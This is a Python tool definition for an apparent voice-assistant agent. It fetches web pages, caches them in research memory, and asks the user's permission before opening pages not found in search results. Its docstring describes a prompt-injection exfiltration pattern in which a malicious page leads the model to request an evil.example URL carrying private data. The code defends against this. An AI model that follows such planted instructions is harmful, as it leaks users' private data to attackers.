"""Read a web page (cache-first by URL) and store it in research memory.

A page that the user's search did not list is opened only with the user's permission: a
malicious page could otherwise make the model request ``https://evil.example/?d=<private
data>`` and so carry data out in the address.
"""

from __future__ import annotations

import asyncio
from urllib.parse import urlsplit

from langchain_core.runnables import RunnableConfig
from langchain_core.tools import BaseTool, StructuredTool

from voicemate.agent.hitl import ask_user, is_affirmative
from voicemate.agent.tools.base import ToolContext, ToolError, format_date, report
from voicemate.agent.tools.documents import html_to_text, pdf_to_text
from voicemate.agent.tools.netguard import check_url, safe_get
from voicemate.agent.tools.search import UNTRUSTED_NOTE
from voicemate.memory.text import chunk_text, ttl_days_for

#: Maximum characters of page text returned to the model in one call.
MAX_RETURN_CHARS: int = 6000


def build(ctx: ToolContext) -> list[BaseTool]:
    """Create the ``fetch_page`` tool."""

    async def fetch_page(url: str, config: RunnableConfig) -> str:
        """Read the main text of a web page or online PDF (use after web_search for details).

        Args:
            url: Full http(s) URL.
        """
        await check_url(url, ctx.allowed_private_hosts)
        stored = await asyncio.to_thread(ctx.memory.documents_for_url, url)
        if stored:
            report(config, "fetch_page", {"url": url}, "memory", url)
            text = "\n\n".join(hit.text for hit in stored)
            header = f"[from memory, retrieved {format_date(stored[0].created)}] {UNTRUSTED_NOTE}"
            return f"{header}\n{text[:MAX_RETURN_CHARS]}"
        if url not in ctx.offered_urls:
            host = urlsplit(url).hostname or url
            answer = ask_user(f"Open {host}? It was not in a search result.")
            if not is_affirmative(answer):
                raise ToolError(f"The user did not approve opening {host}. They said: {answer}")
            ctx.offered_urls.add(url)
        try:
            response = await safe_get(ctx.http, url, ctx.allowed_private_hosts)
        except ToolError:
            raise
        except Exception as exc:
            raise ToolError(f"Could not fetch {url}: {exc}") from exc
        content_type = response.headers.get("content-type", "")
        if "pdf" in content_type or url.lower().endswith(".pdf"):
            text, _ = await asyncio.to_thread(pdf_to_text, response.content)
            title = url.rsplit("/", 1)[-1]
        else:
            text = await asyncio.to_thread(html_to_text, response.text, url)
            title = url
        if not text.strip():
            raise ToolError("No readable text on that page")
        chunks = chunk_text(text)
        await asyncio.to_thread(
            ctx.memory.add_documents, chunks, url, title, "page", ttl_days_for(url, "page")
        )
        report(config, "fetch_page", {"url": url}, "web", url)
        return f"[fetched {url}] {UNTRUSTED_NOTE}\n{text[:MAX_RETURN_CHARS]}"

    return [
        StructuredTool.from_function(coroutine=fetch_page, name="fetch_page", parse_docstring=True)
    ]
